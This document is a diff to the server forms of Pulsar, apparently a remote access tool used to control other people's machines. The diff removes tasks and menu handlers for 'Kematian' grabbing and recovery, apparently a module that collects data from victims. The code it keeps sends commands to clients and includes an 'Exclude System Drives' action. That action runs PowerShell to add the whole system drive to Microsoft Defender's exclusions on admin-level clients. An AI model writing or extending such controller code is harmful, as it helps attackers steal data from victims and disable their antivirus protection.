@@ -600,10 +600,6 @@ namespace Pulsar.Server.Forms
                         client.Send(new DoSendQuickCommand { Command = subItem1, Host = subItem0 });
                         break;
 
-                    case "Kematian Recovery":
-                        new KematianHandler(client).RequestKematianZip();
-                        break;
-
                     case "Exclude System Drives":
                         string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
                         if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
@@ -1451,17 +1447,6 @@ namespace Pulsar.Server.Forms
             }
         }
 
-        private void kematianGrabbingToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                var kematianHandler = new Messages.KematianHandler(c);
-                FrmKematian frmK = new FrmKematian(c, kematianHandler);
-                frmK.Show();
-                frmK.Focus();
-            }
-        }
-
         private void installVirtualMonitorToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -1856,11 +1841,6 @@ namespace Pulsar.Server.Forms
             newItem.SubItems.Add(param2);
             lstTasks.Items.Add(newItem);
             SaveAutoTasks();
-        }
-
-        private void kematianToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            AddTask("Kematian Recovery", "", "");
         }
 
         private void excludeSystemDriveToolStripMenuItem_Click(object sender, EventArgs e)
